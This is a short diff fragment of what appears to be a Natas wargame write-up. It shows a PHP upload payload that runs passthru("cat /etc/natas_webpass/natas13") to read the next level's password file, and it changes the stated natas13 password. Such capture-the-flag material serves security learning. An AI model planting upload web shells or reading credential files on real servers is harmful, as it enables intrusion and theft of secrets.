@@ -5,4 +5,4 @@ non .jpg file instead.  So, upload the PHP file below and change the filename be
         passthru("cat /etc/natas_webpass/natas13");
 ?>
 
-password for natas13 is jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+password for natas13 is g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
